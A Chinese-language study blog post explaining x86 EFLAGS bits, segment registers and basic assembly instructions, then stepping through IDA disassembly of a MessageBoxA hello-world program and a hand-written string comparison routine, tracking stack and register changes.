<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、状态标志(Status Flags)</span><br><span class="line">EFLAGS寄存器的状态标志(0、2、4、6、7以及11位)指示算术指令（如ADD, SUB, MUL以及DIV指令）的结果，这些状态标志的作用如下：</span><br><span class="line"></span><br><span class="line">CF(bit 0) [Carry flag]   若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置1，反之清零。这个标志指示无符号整型运算的溢出状态，这个标志同样在多倍精度运算(multiple-precision arithmetic)中使用。</span><br><span class="line">PF(bit 2) [Parity flag]   如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。</span><br><span class="line">AF(bit 4) [Adjust flag]   如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。这个标志在BCD(binary-code decimal)算术运算中被使用。</span><br><span class="line">ZF(bit 6) [Zero flag]   若结果为0则将其置1，反之清零。</span><br><span class="line">SF(bit 7) [Sign flag]   该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负)</span><br><span class="line">OF(bit 11) [Overflow flag]   如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该位置1，反之清零。这个标志为带符号整型运算指示溢出状态。</span><br><span class="line"></span><br><span class="line">在这些状态标志中，只有CF标志能够通过使用STC, CLC以及CMC指令被直接修改，或者通过位指令(BT, BTS, BTR以及BTC)将指定的位拷贝至CF标志中。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、DF标志(DF flag)</span><br><span class="line">这个方向标志(位于EFLAGS寄存器的第10位)控制串指令(MOVS, CMPS, SCAS, LODS以及STOS)。设置DF标志使得串指令自动递减（从高地址向低地址方向处理字符串），清除该标志则使得串指令自动递增。STD以及CLD指令分别用于设置以及清除DF标志。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、系统标志以及IOPL域(System Flags and IOPL Field)</span><br><span class="line"></span><br><span class="line">EFLAGS寄存器中的这部分标志用于控制操作系统或是执行操作，它们不允许被应用程序所修改。这些标志的作用如下：</span><br><span class="line"></span><br><span class="line">TF(bit 8) [Trap flag]   将该位设置为1以允许单步调试模式，清零则禁用该模式。</span><br><span class="line">IF(bit 9) [Interrupt enable flag]   该标志用于控制处理器对可屏蔽中断请求(maskable interrupt requests)的响应。置1以响应可屏蔽中断，反之则禁止可屏蔽中断。</span><br><span class="line">IOPL(bits 12 and 13) [I/O privilege level field]   指示当前运行任务的I/O特权级(I/O privilege level)，正在运行任务的当前特权级(CPL)必须小于或等于I/O特权级才能允许访问I/O地址空间。这个域只能在CPL为0时才能通过POPF以及IRET指令修改。</span><br><span class="line">NT(bit 14) [Nested task flag]   这个标志控制中断链和被调用任务。若当前任务与前一个执行任务相关则置1，反之则清零。</span><br><span class="line">RF(bit 16) [Resume flag]   控制处理器对调试异常的响应。</span><br><span class="line">VM(bit 17) [Virtual-8086 mode flag]   置1以允许虚拟8086模式，清除则返回保护模式。</span><br><span class="line">AC(bit 18) [Alignment check flag]   该标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。</span><br><span class="line">VIF(bit 19) [Virtual interrupt flag]   该标志是IF标志的虚拟镜像(Virtual image)，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展(virtual mode extensions)</span><br><span class="line">VIP(bit 20) [Virtual interrupt pending flag]   该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零。【Software sets and clears this flag; the processor only reads it.】与VIF标志结合使用。</span><br><span class="line">ID(bit 21) [Identification flag]   程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。</span><br></pre></td></tr></table></figure></div>

<ul>
<li>段寄存器</li>
</ul>
<p>CS-指向用于存放指令的段,与IP（偏移量结合），得到下一次要执行的指令</p>
<p>SS-指向用于堆栈的段,SP指向栈顶，同时可用BP访问整个栈</p>
<p>DS-指向数据段，与偏移量结合可以指向对应的数据</p>
<p>ES-指向附加段</p>
<h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><p>public start-用于声明一个函数，其是公用的（可被其他函数调用），其他函数也可类似声明。</p>
<p>start proc near-表示函数开头,此处start表明了是函数入口,对其他的函数来说这个”start”可以换成对应的函数名。</p>
<p>start endp-表示函数结尾，对其他的函数来说这个”start”可以换成对应的函数名。</p>
<p>jmp-无条件跳转(移动eip)至后面的标号，格式为 jmp 标号</p>
<p>push-压栈，常用于传参，保存数据</p>
<p>pop-跟pop相对，将栈顶弹出</p>
<p>call-将call指令的下一个指令压入栈中，同时移动eip至标号处 call 标号</p>
<p>offset-相当于取地址</p>
<p>retn-与call搭配使用先将压入栈中的指令取回放入eip中，同时将esp+n 格式为retn n</p>
<p>inc-将后面对应的寄存器自增1，会引起SF值,ZF值的修改，具体见上面ZF,SF的作用</p>
<p>add-将后项加前项赋给前项，格式 add a，b</p>
<p>dec-将后面对应的寄存器自减1，会引起SF值,ZF值的修改，具体见上面ZF,SF的作用</p>
<p>rep-重复一条指令,每执行一次ECX-1,ECX&#x3D;0时停止</p>
<p>loop&#x2F;LOOPD-重复指令块,每执行一次ECX-1,ECX&#x3D;0时停止</p>
<h1 id="汇编调试"><a href="#汇编调试" class="headerlink" title="汇编调试"></a>汇编调试</h1><h2 id="HeloWorld-exe"><a href="#HeloWorld-exe" class="headerlink" title="HeloWorld.exe"></a>HeloWorld.exe</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401005 public start</span><br><span class="line">.text:00401005 start proc near</span><br><span class="line">.text:00401005 jmp     sub_401010</span><br><span class="line">.text:00401005 start endp</span><br></pre></td></tr></table></figure></div>

<p>public start-用于声明一个函数，其是公用的（可被其他函数调用），其他函数也可类似声明。</p>
<p>start proc near-表示函数开头,此处start表明了是函数入口,对其他的函数来说这个”start”可以换成对应的函数名。</p>
<p>start endp-表示函数结尾，对其他的函数来说这个”start”可以换成对应的函数名。</p>
<p>jmp-jmp     sub_401010-运行结果如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224221201527.png"
                      alt="image-20221224221201527"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224221142009.png"
                      alt="image-20221224221142009"
                ></p>
<p>只修改了EIP值相当于指向了第一个函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401010 sub_401010 proc near                    ; CODE XREF: start↑j</span><br><span class="line">.text:00401010 push    0                               ; uType</span><br><span class="line">.text:00401012 push    offset Caption                  ; &quot;D0g3!&quot;</span><br><span class="line">.text:00401017 push    offset Text                     ; &quot;Welcome to Re&quot;</span><br><span class="line">.text:0040101C push    0                               ; hWnd</span><br><span class="line">.text:0040101E call    MessageBoxA</span><br><span class="line">.text:00401023 push    0                               ; uExitCode</span><br><span class="line">.text:00401025 call    ExitProcess</span><br><span class="line">.text:00401025 sub_401010 endp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224222915631.png"
                      alt="image-20221224222915631"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224222931903.png"
                      alt="image-20221224222931903"
                ></p>
<p>当前ip指向push 0,ida常以”;”作注释，搜索后发现其应该是</p>
<p>MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)的第一个参数。</p>
<p>push-push    0结果如下</p>
<p>执行此命令后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223515193.png"
                      alt="image-20221224223515193"
                ></p>
<p>变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223545415.png"
                      alt="image-20221224223545415"
                ></p>
<p>将0压入了栈内相当于将栈顶提高了一位（4字节 32bit）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223722949.png"
                      alt="image-20221224223722949"
                ></p>
<p>剩下的push都是类似的变化</p>
<p>此处应该都是对MessageBox传参</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223829476.png"
                      alt="image-20221224223829476"
                ></p>
<p>定义了弹窗类型，传递了字符串的指针，也定义了按钮和图标</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224223927998.png"
                      alt="image-20221224223927998"
                ></p>
<p>这几个push执行后栈内也多了两个字符串的地址和两个数字0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224224025205.png"
                      alt="image-20221224224025205"
                ></p>
<p>栈顶也被抬高了4位，EIP也向后移动了15</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040101E call    MessageBoxA</span><br><span class="line">.text:00401023 push    0                               ; uExitCode</span><br><span class="line">.text:00401025 call    ExitProcess</span><br><span class="line">.text:00401025 sub_401010 endp</span><br></pre></td></tr></table></figure></div>

<p>。</p>
<p>call-此处call函数将</p>
<p>call函数的下一个指令.text:00401023 push    0   的地址放入了栈中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224232526961.png"
                      alt="image-20221224232526961"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224232540977.png"
                      alt="image-20221224232540977"
                ></p>
<p>ESP也因此抬高了一位，EIP指向了所call的函数MessageBoxA的函数头</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224234025573.png"
                      alt="image-20221224234025573"
                ></p>
<p>dword ptr n 就是ESP + n处栈中存取的数据</p>
<p>同时也定义了对应参数在栈内的位置</p>
<p>如dword ptr 4 就是ESP + 4 &#x3D; 0019FF60 + 4 &#x3D; 0019FF64</p>
<p>正对应了压入栈中的参数0<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224234349159.png"
                      alt="image-20221224234349159"
                ></p>
<p>其他参数获取原理类似。</p>
<p>offset-__imp_MessageBoxA dd offset user32_MessageBoxA</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225000500211.png"
                      alt="image-20221225000500211"
                ></p>
<p>offset 指令相当于把对应函数“user32_MessageBoxA”的指针（指向函数的头部）给了这个”__imp_MessageBoxA“让其有了等效的作用</p>
<p>所以在上文的jmp中直接jmp到了user32_MessageBoxA这个函数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user32.dll:772519E0 user32_MessageBoxA:</span><br><span class="line">user32.dll:772519E0 mov     edi, edi</span><br><span class="line">user32.dll:772519E2 push    ebp</span><br><span class="line">user32.dll:772519E3 mov     ebp, esp</span><br><span class="line">user32.dll:772519E5 cmp     dword_77276C94, 0</span><br><span class="line">user32.dll:772519EC jz      short loc_77251A10</span><br><span class="line">user32.dll:772519EE mov     eax, large fs:18h</span><br><span class="line">user32.dll:772519F4 mov     edx, offset unk_772771A4</span><br><span class="line">user32.dll:772519F9 mov     ecx, [eax+24h]</span><br><span class="line">user32.dll:772519FC xor     eax, eax</span><br><span class="line">user32.dll:772519FE lock cmpxchg [edx], ecx</span><br><span class="line">user32.dll:77251A02 test    eax, eax</span><br><span class="line">user32.dll:77251A04 jnz     short loc_77251A10</span><br><span class="line">user32.dll:77251A06 mov     dword_77276D00, 1</span><br></pre></td></tr></table></figure></div>

<p>mov edi, edi</p>
<p>mov是将后项覆盖给前项，但此处自己覆盖自己是不会改变的</p>
<p>此处这么做的目的在网上搜了一下：</p>
<p>1.为了实现hot-patching技术，即运行时修改一个函数的行为。</p>
<p>2.为了提高效率。执行一条MOV指令比执行两条NOP指令花费更少的时间。</p>
<p>其他的mov指令也是类似的覆盖 </p>
<p>push ebp </p>
<p>原来ebp如下图</p>
<p>将EBP的所存的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225001444463.png"
                      alt="image-20221225001444463"
                ></p>
<p>压入了栈中，抬高了一位ESP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225001732773.png"
                      alt="image-20221225001732773"
                ></p>
<p>同时EBP中所存的不会因push而被抛弃掉</p>
<p>mov ebp, esp将esp指向的栈顶位置赋给ebp</p>
<p>原ebp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225002625179.png"
                      alt="image-20221225002625179"
                ></p>
<p>赋值后的ebp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225002651473.png"
                      alt="image-20221225002651473"
                ></p>
<p>cmp     dword_77276C94, 0</p>
<p>将dword_77276c94(0)与0比较</p>
<table>
<thead>
<tr>
<th>CMP结果</th>
<th>ZF</th>
<th>CF</th>
</tr>
</thead>
<tbody><tr>
<td>目的操作数 &lt; 源操作数</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>目的操作数 &gt; 源操作数</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>目的操作数 &#x3D; 源操作数</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p>因为相等 所以ZF&#x3D;1,CF&#x3D;0但初始状态下ZF&#x3D;1,CF&#x3D;0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225003354313.png"
                      alt="image-20221225003354313"
                ></p>
<p>所以此处ZF,CF值没有变化</p>
<p>jz      short loc_77251A10</p>
<p>根据ZF为1就跳转，ZF为0就不跳转</p>
<p>此处在执行cmp     dword_77276C94, 0后ZF为1</p>
<p>其会跳转（将EIP移向）short loc_77251A10</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user32.dll:77251A10 loc_77251A10:                           ; CODE XREF: user32.dll:user32_MessageBoxA+C↑j</span><br><span class="line">user32.dll:77251A10                                         ; user32.dll:user32_MessageBoxA+24↑j</span><br><span class="line">user32.dll:77251A10 push    0FFFFFFFFh</span><br><span class="line">user32.dll:77251A12 push    0</span><br><span class="line">user32.dll:77251A14 push    dword ptr [ebp+14h]</span><br><span class="line">user32.dll:77251A17 push    dword ptr [ebp+10h]</span><br><span class="line">user32.dll:77251A1A push    dword ptr [ebp+0Ch]</span><br><span class="line">user32.dll:77251A1D push    dword ptr [ebp+8]</span><br><span class="line">user32.dll:77251A20 call    near ptr user32_MessageBoxTimeoutA</span><br><span class="line">user32.dll:77251A25 pop     ebp</span><br><span class="line">user32.dll:77251A26 retn    10h</span><br></pre></td></tr></table></figure></div>

<p>前面的push为一如既往的传参操作</p>
<p>call也是调用对应的弹窗函数，可见前文有相对应的。</p>
<p>pop ebp</p>
<p>将栈顶的弹出给ebp</p>
<p>原栈顶和ebp：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225004823350.png"
                      alt="image-20221225004823350"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225004829852.png"
                      alt="image-20221225004829852"
                ></p>
<p>执行后：</p>
<p>原栈顶的数据并不会被清除只是将栈顶下移了一位</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005011800.png"
                      alt="image-20221225005011800"
                ></p>
<p>ebp也变为了原栈顶所对应的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005018288.png"
                      alt="image-20221225005018288"
                ></p>
<p>retn 10h</p>
<p>原ESP和EIP及原栈顶</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005136127.png"
                      alt="image-20221225005136127"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005143222.png"
                      alt="image-20221225005143222"
                ></p>
<p>执行后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225005232923.png"
                      alt="image-20221225005232923"
                ></p>
<p>相当于将原栈顶的数据弹出给了EIP使得ESP+4h</p>
<p>又让ESP+10h（retn后面所跟的数值）</p>
<p>所以retn n&#x3D; </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop eip</span><br><span class="line">add esp 0xn</span><br></pre></td></tr></table></figure></div>

<h2 id="strcmp-exe"><a href="#strcmp-exe" class="headerlink" title="strcmp.exe"></a>strcmp.exe</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401005 public start</span><br><span class="line">.text:00401005 start proc near</span><br><span class="line">.text:00401005 jmp     sub_40101C</span><br><span class="line">.text:00401005 start endp</span><br></pre></td></tr></table></figure></div>

<p>jmp     sub_40101C</p>
<p>EIP 00401005(start函数头)-&gt;0040101C(sub_40101C函数头)</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_40101C proc near                    ; CODE XREF: start↑j</span><br><span class="line">.text:0040101C push    offset aAbcdabcd                ; &quot;abcdabcd&quot;</span><br><span class="line">.text:00401021 push    offset aAbcdabcd_0              ; &quot;abcdABCD&quot;</span><br><span class="line">.text:00401026 call    sub_401032</span><br><span class="line">.text:0040102B push    0                               ; uExitCode</span><br><span class="line">.text:0040102D call    ExitProcess</span><br><span class="line">.text:0040102D sub_40101C endp</span><br></pre></td></tr></table></figure></div>



<p>push    offset aAbcdabcd</p>
<p>ESP 0019FF74-&gt;0019FF70</p>
<p>EIP 0040101C(sub_40101C)-&gt;00401021</p>
<p>栈顶：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225141731899.png"
                      alt="image-20221225141731899"
                ></p>
<p>变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225142145042.png"
                      alt="image-20221225142145042"
                ></p>
<p>下面的push也类似</p>
<p>ESP 0019FF70-&gt;0019FF6C</p>
<p>EIP 00401021-&gt;00401026</p>
<p>栈顶变为</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225142305984.png"
                      alt="image-20221225142305984"
                ></p>
<p>call    sub_401032</p>
<p>EIP 00401026-&gt;00401032(sub_401032的函数头部)</p>
<p>ESP 0019FF6C-&gt;0019FF68</p>
<p>栈顶变为</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225143653981.png"
                      alt="image-20221225143653981"
                ></p>
<p>存放了原call函数所在的EIP 00401026加上该call函数所占存储位5变为了0040102B</p>
<p>所call的函数如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401032 sub_401032 proc near                    ; CODE XREF: .text:0040100A↑j</span><br><span class="line">.text:00401032                                         ; sub_40101C+A↑p</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401032 arg_0= dword ptr  8</span><br><span class="line">.text:00401032 arg_4= dword ptr  0Ch</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401032 push    ebp</span><br><span class="line">.text:00401033 mov     ebp, esp</span><br><span class="line">.text:00401035 push    eax</span><br><span class="line">.text:00401036 push    edx</span><br><span class="line">.text:00401037 push    esi</span><br><span class="line">.text:00401038 push    edi</span><br><span class="line">.text:00401039 mov     esi, [ebp+arg_0]</span><br><span class="line">.text:0040103C mov     edi, [ebp+arg_4]</span><br><span class="line">.text:0040103F</span><br></pre></td></tr></table></figure></div>

<p>arg_0&#x3D; dword ptr  8&#x3D;ESP+8<br>arg_4&#x3D; dword ptr  0Ch&#x3D;ESP+12</p>
<p>push ebp</p>
<p>ESP 0019FF68-&gt;0019FF64</p>
<p>EIP 00401032-&gt;00401033</p>
<p>将EBP中所存的压入了栈中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225150217063.png"
                      alt="image-20221225150217063"
                ></p>
<p>mov     ebp, esp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225150501034.png"
                      alt="image-20221225150501034"
                ></p>
<p>将esp中存放的移给ebp（不改变栈顶）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225150540065.png"
                      alt="image-20221225150540065"
                ></p>
<p>push    eax</p>
<p>push    edx</p>
<p>push    esi</p>
<p>push    edi</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225151006067.png"
                      alt="image-20221225151006067"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225151012367.png"
                      alt="image-20221225151012367"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225151019532.png"
                      alt="image-20221225151019532"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225151026351.png"
                      alt="image-20221225151026351"
                ></p>
<p>将其都压入了栈中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225151057476.png"
                      alt="image-20221225151057476"
                ></p>
<p>mov     esi, [ebp+arg_0]</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225151019532.png"
                      alt="image-20221225151019532"
                ></p>
<p>ESI变为了</p>
<p>EBP+8（arg_0&#x3D; dword ptr  8此处定义了arg_0的偏移量）所指向的数据</p>
<p>EBP为 0019FF64</p>
<p>其加8就对应了</p>
<p>0019FF6C  00404000  .data:aAbcdabcd_0</p>
<p>下面的</p>
<p>mov     edi, [ebp+arg_4]</p>
<p>也是同理将edi变为了</p>
<p>0019FF70  00404009  .data:aAbcdabcd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225152236920.png"
                      alt="image-20221225152236920"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040103F loc_40103F:                             ; CODE XREF: sub_401032+22↓j</span><br><span class="line">.text:0040103F mov     al, [esi]</span><br><span class="line">.text:00401041 mov     dl, [edi]</span><br><span class="line">.text:00401043 cmp     al, 0</span><br><span class="line">.text:00401045 jnz     short loc_40104E</span><br><span class="line">.text:00401047 cmp     dl, 0</span><br><span class="line">.text:0040104A jnz     short loc_40104E</span><br><span class="line">.text:0040104C jmp     short loc_401056</span><br></pre></td></tr></table></figure></div>

<p>mov     al, [esi]</p>
<p>al是ax的低八位,EAX又在ax的基础上扩展了16位</p>
<p>相当于修改了eax的低八位</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225154057893.png"
                      alt="image-20221225154057893"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225154109739.png"
                      alt="image-20221225154109739"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225154208364.png"
                      alt="image-20221225154208364"
                ></p>
<p>此处方括号相当于将esi所指向的解引用后传给al，因为esi指向的是”abcdABCD”解引用后是a其ascii码为61所以</p>
<p>EAX的低八位变为了61</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225155113585.png"
                      alt="image-20221225155113585"
                ></p>
<p>mov     dl, [edi]</p>
<p>edi指向的是”abcdabcd”</p>
<p>也是同理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225155201148.png"
                      alt="image-20221225155201148"
                ></p>
<p>edx变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225155213193.png"
                      alt="image-20221225155213193"
                ></p>
<p>cmp     al, 0</p>
<p>al目前值为61</p>
<table>
<thead>
<tr>
<th>CMP结果</th>
<th>ZF</th>
<th>CF</th>
</tr>
</thead>
<tbody><tr>
<td>目的操作数 &lt; 源操作数</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>目的操作数 &gt; 源操作数</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>目的操作数 &#x3D; 源操作数</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p>所以原ZF&#x3D;1,CF&#x3D;0</p>
<p>变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225155525194.png"
                      alt="image-20221225155525194"
                ></p>
<p>jnz     short loc_40104E</p>
<p>条件跳转指令在ZF&#x3D;0情况下跳转 其他类似jmp，只是将eip移向了后面的标号处</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040104E loc_40104E:                             ; CODE XREF: sub_401032+13↑j</span><br><span class="line">.text:0040104E                                         ; sub_401032+18↑j</span><br><span class="line">.text:0040104E cmp     al, dl</span><br><span class="line">.text:00401050 pushf</span><br><span class="line">.text:00401051 inc     esi</span><br><span class="line">.text:00401052 inc     edi</span><br><span class="line">.text:00401053 popf</span><br><span class="line">.text:00401054 jz      short loc_40103F</span><br></pre></td></tr></table></figure></div>

<p>cmp道理同上</p>
<p>al&#x3D;dl</p>
<p>zf&#x3D;1</p>
<p>pushf</p>
<p>将EFLAGS中的放入了栈中（保护其不受改变）</p>
<p>其16进制表达如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225161040239.png"
                      alt="image-20221225161040239"
                ></p>
<p>inc     esi</p>
<p>inc     edi</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225161125997.png"
                      alt="image-20221225161125997"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225161135824.png"
                      alt="image-20221225161135824"
                ></p>
<p>相当于将ESI,EDI都向后移动一位</p>
<p>popf</p>
<p>因为算数时也会影响到EFLAGS数据所以将在栈中的EFLAGS数据又覆盖回EFLAGS寄存器起到备份作用</p>
<p>jz      short loc_40103F</p>
<p>此处相当于如果al&#x3D;dl就返回原函数继续比较相当于该字符串的该字符相等就继续比较下一个字符</p>
<p>然后cmp al， 0 的操作是验证是否到了字符串末尾，</p>
<p>直到不相等（ZF&#x3D;0）或到达末尾(ZF&#x3D;1,因比较的函数如果不跳转回去其下一个函数就是用来退出的函数loc_401056)时</p>
